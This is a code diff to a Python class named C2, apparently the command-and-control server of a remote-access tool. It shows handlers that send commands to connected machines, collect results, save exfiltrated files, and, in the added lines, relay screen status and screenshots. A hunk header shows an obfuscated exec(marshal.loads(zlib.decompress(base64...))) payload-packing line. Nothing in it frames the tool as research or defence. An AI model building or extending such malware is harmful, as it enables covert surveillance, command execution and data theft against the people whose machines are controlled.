@@ -25,6 +25,8 @@ class C2:
         self.sio.on('command', self.send_command)
         self.sio.on('result', self.get_result)
         self.sio.on('download_file_return', self.save_file)
+        self.sio.on('screen_status', self.screen_status)
+        self.sio.on('screenshot', self.screenshot_taken)
 
 
     def on_connect(self, sid, data):
@@ -236,4 +238,12 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
 
         with open(f"files_saved/{data['uuid']}_{datetime.datetime.now().strftime('%Y-%m-%d-%H-%M-%S')}_{data['file_name']}", 'wb') as f:
             f.write(base64.b64decode(data['file']))
+
+
+    def screen_status(self, sid, data):
+        print(data)
+        self.sio.emit('screen_status', data)
+
+    def screenshot_taken(self, sid, data):
+        sio.emit("screenshot", data)
 
